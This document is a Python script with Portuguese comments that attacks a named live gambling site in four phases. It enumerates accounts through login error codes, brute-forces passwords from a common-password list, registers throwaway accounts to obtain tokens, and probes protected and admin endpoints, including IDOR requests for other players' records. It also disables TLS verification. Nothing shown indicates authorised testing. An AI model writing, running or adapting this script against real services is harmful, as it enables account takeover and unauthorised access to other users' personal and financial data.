"""
1. Enumeração de usuários — confirma quais números existem
2. Brute-force de senha no usuário encontrado
3. Registro de nova conta para obter token válido
4. Exploração após autenticação
"""
import urllib.request, ssl, json, uuid, time, re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

DEVICE_ID = str(uuid.uuid4()).replace("-","")[:32]
BASE = "https://ds.amizade777.com"

def post(url, data, token=None):
    body = json.dumps(data).encode()
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0)",
        "Content-Type": "application/json",
        "Accept": "application/json, */*",
    }
    if token:
        h["token"] = token
    try:
        r = urllib.request.Request(url, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=8, context=ctx) as resp:
            raw = resp.read(4096).decode("utf-8","ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        raw = e.read(2048).decode("utf-8","ignore")
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

def get(url, token=None):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if token:
        h["token"] = token
    try:
        r = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(r, timeout=8, context=ctx) as resp:
            raw = resp.read(4096).decode("utf-8","ignore")
            return resp.status, {}, raw
    except urllib.error.HTTPError as e:
        raw = e.read(2048).decode("utf-8","ignore")
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

def login(phone, password):
    data = {
        "appChannel": "pc",
        "appPackageName": "com.slots.big",
        "deviceId": DEVICE_ID,
        "deviceModel": "WEB",
        "deviceVersion": "WEB",
        "appVersion": "1.0.0",
        "sysTimezone": "-180",
        "sysLanguage": "pt-BR",
        "phone": phone,
        "password": password,
    }
    st, h, body = post(BASE + "/prod-api/player/sign-in", data)
    try:
        return json.loads(body)
    except:
        return {"code": st, "msg": body[:80]}

# =====================================================
# FASE 1: Enumeração de usuários
# =====================================================
print("="*60)
print("FASE 1: ENUMERAÇÃO DE USUÁRIOS")
print("="*60)
print("code 102001 = usuário NÃO existe")
print("code 102003 = EXISTE (senha errada)")
print()

# Buscar mais usuários com números brasileiros comuns em sistemas de teste
candidatos = []
numeros_teste = [
    # Números sequenciais comuns em sistemas de teste
    "13800000000", "13800000001", "13800000002", "13800000003",
    "13800000010", "13800000100",
    "11999999999", "11999999998",
    "10000000000", "10000000001",
    "12345678901", "12345678900",
    "00000000000", "99999999999",
    "11111111111", "22222222222",
    # Números curtos/admin
    "123456789", "1234567890",
    "0000000000", "1111111111",
    # Possíveis admins com formato de e-mail ou usuario
    "admin123", "test123", "user123",
]

for num in numeros_teste:
    resp = login(num, "senha_errada_xyz_123")
    code = resp.get("code")
    msg  = resp.get("msg","")
    if code == 102003:  # EXISTE!
        print(f"  [EXISTE] {num}: {msg}")
        candidatos.append(num)
    elif code not in (102001, 102009):
        print(f"  [?] {num}: code={code} msg={msg!r}")

print(f"\nUsuários encontrados: {candidatos}")

# =====================================================
# FASE 2: Brute-force de senha no(s) usuário(s) encontrado(s)
# =====================================================
if candidatos:
    print("\n" + "="*60)
    print(f"FASE 2: BRUTE-FORCE DE SENHA em {candidatos[0]}")
    print("="*60)

    senhas = [
        "123456", "12345678", "1234567890",
        "admin", "admin123", "Admin@123",
        "password", "Password1", "pass123",
        "test", "test123", "Test@123",
        "qwerty", "abc123",
        "111111", "000000", "123123",
        "aa123456", "Aa123456",
        "1q2w3e", "1q2w3e4r",
        "senha", "senha123", "Senha@123",
        "123mudar", "mudar123",
        candidatos[0],  # próprio número como senha
        candidatos[0][-6:],  # últimos 6 dígitos
    ]

    token_ok = None
    for senha in senhas:
        resp = login(candidatos[0], senha)
        code = resp.get("code")
        msg  = resp.get("msg","")
        print(f"  senha={senha!r} -> code={code} msg={msg!r}")
        if code == 200:
            print("  *** SENHA ENCONTRADA! ***")
            data = resp.get("data", {})
            token_ok = data.get("token") or resp.get("token")
            print(f"  Token: {token_ok}")
            print(f"  Dados: {json.dumps(data, ensure_ascii=False)[:300]}")
            break

# =====================================================
# FASE 3: Registro de nova conta
# =====================================================
print("\n" + "="*60)
print("FASE 3: REGISTRO DE NOVA CONTA")
print("="*60)

phone_novo = f"9{int(time.time()) % 100000000:09d}"
senha_nova = "Test@12345"

registros = [
    ("/prod-api/player/register", {
        "appChannel": "pc", "appPackageName": "com.slots.big",
        "deviceId": DEVICE_ID, "deviceModel": "WEB",
        "deviceVersion": "WEB", "appVersion": "1.0.0",
        "phone": phone_novo, "password": senha_nova,
        "confirmPassword": senha_nova, "inviteCode": "",
        "sysTimezone": "-180", "sysLanguage": "pt-BR",
    }),
    ("/prod-api/player/sign-up", {
        "phone": phone_novo, "password": senha_nova,
        "appPackageName": "com.slots.big", "deviceId": DEVICE_ID,
        "appChannel": "pc",
    }),
    ("/prod-api/member/register", {
        "mobile": phone_novo, "password": senha_nova,
        "appPackageName": "com.slots.big", "deviceId": DEVICE_ID,
    }),
]

token_registro = None
for ep, payload in registros:
    st, _, body = post(BASE + ep, payload)
    if st != 404:
        try:
            j = json.loads(body)
            print(f"  [{st}] {ep} -> code={j.get('code')} msg={j.get('msg','')!r}")
            if j.get("code") == 200:
                print(f"  *** CONTA CRIADA: phone={phone_novo} senha={senha_nova} ***")
                data = j.get("data", {})
                token_registro = data.get("token")
                print(f"  Token: {token_registro}")
                # Tentar login com a conta criada
                resp_login = login(phone_novo, senha_nova)
                print(f"  Login pós-registro: {json.dumps(resp_login, ensure_ascii=False)[:300]}")
        except:
            print(f"  [{st}] {ep} -> {body[:100]}")

# =====================================================
# FASE 4: Usar token para explorar endpoints protegidos
# =====================================================
token_ativo = token_ok or token_registro
if token_ativo:
    print("\n" + "="*60)
    print(f"FASE 4: EXPLORAÇÃO COM TOKEN {token_ativo[:20]}...")
    print("="*60)

    endpoints_auth = [
        ("GET",  "/prod-api/player/info"),
        ("GET",  "/prod-api/player/balance"),
        ("GET",  "/prod-api/vip/info"),
        ("GET",  "/prod-api/finance/recharge/list"),
        ("GET",  "/prod-api/finance/withdraw/list"),
        ("GET",  "/prod-api/invite/info"),
        ("GET",  "/prod-api/game/list"),
        ("GET",  "/prod-api/bank/list"),
        ("GET",  "/prod-api/notice/list"),
        # IDOR — acessar info de outros usuários
        ("GET",  "/prod-api/player/1"),
        ("GET",  "/prod-api/player/2"),
        ("GET",  "/prod-api/player/100"),
        ("GET",  "/prod-api/admin/user/list"),
        ("GET",  "/prod-api/admin/player/list"),
    ]

    for method, ep in endpoints_auth:
        if method == "GET":
            st, _, body = get(BASE + ep, token=token_ativo)
        else:
            st, _, body = post(BASE + ep, {}, token=token_ativo)
        if st not in (0, 404, 405):
            try:
                j = json.loads(body)
                print(f"  [{method} {st}] {ep} -> code={j.get('code')} {json.dumps(j, ensure_ascii=False)[:150]}")
            except:
                print(f"  [{method} {st}] {ep} -> {body[:100]}")
else:
    print("\n[Nenhum token obtido — adicione credenciais válidas manualmente se tiver uma conta]")
    print("Se você tem uma conta, edite este script e adicione:")
    print("  token_ativo = 'SEU_TOKEN_AQUI'")

print("\n\nConcluído.")
